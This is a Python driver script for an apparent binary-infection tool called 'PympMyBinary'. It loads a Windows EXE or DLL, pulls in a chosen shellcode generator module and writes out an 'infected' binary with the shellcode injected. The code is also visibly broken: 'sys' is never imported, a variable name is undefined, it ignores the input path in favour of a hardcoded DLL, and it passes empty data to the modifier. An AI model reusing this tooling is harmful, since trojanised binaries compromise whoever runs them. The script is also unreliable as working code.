import os
import importlib

from ShellCodeGenerators.GarbageGenerator import *
from ShellCodeGenerators.GarbageGeneratorXL import GarbageGeneratorXL
from BinaryModifiers.Win32BinaryModifier import Win32BinaryModifier



BINARIES_PATH='./Binaries/'
CLEAN_EXE= 'TestBinary.exe'
INFECTED_EXE = 'PympedBinary.exe'
CLEAN_DLL = 'TestBinary.dll'
INFECTED_DLL = 'PympedBinary.dll'

def _print_usage():
    print("PympMyBinary -i input binary path -o output binary path -s shellcode module name")





if __name__=='__main__':

    binary = None

    clear_command = 'cls' if os.name == 'nt' else 'clear'
    os.system(clear_command)
    _print_usage()
    arguments = input().split(' ')

    input_binary_path = None
    output_binary_path = None
    shellcode_module_name = None

    if len(arguments) != 6:
        print("Invalid number of arguments.")
        sys.exit(1)
    else:
        input_binary_path = arguments[input_binary_arguments.index('-i') + 1]
        output_binary_path = arguments[arguments.index('-o') + 1]
        shellcode_module_name = arguments[arguments.index('-s') + 1]
        if None in [input_binary_path, output_binary_path, shellcode_module_name]:
            print("One or more arguments are null.")
            sys.exit(1)

    binary_data = None
    shellcode_generator = None

    if os.path.isfile(input_binary_path):

        with open(BINARIES_PATH + CLEAN_DLL, "rb") as f:
            binary = bytearray(f.read())

        if os.path.isdir(os.path.abspath(output_binary_path)):
            shellcode_generator = getattr(importlib.import_module(shellcode_module_name, "ShellCodeGenerators"), shellcode_module_name)
            ##Error check?
        else:
            print("Invalid destination directory.")
            sys.exit(1)
    else:
        print("Invalid source path.")
        sys.exit(1)

    binary_modifier = Win32BinaryModifier()
    binary_modifier.set_binary(binary_data)
    binary_modifier.set_shell_code_generator(shellcode_generator)
    binary_modifier.modify_binary()

    infected_binary = binary_modifier.get_result()

    try:
        os.remove(output_binary_path)
    except OSError:
        pass

    with open(output_binary_path, "wb") as f:
        f.write(infected_binary)



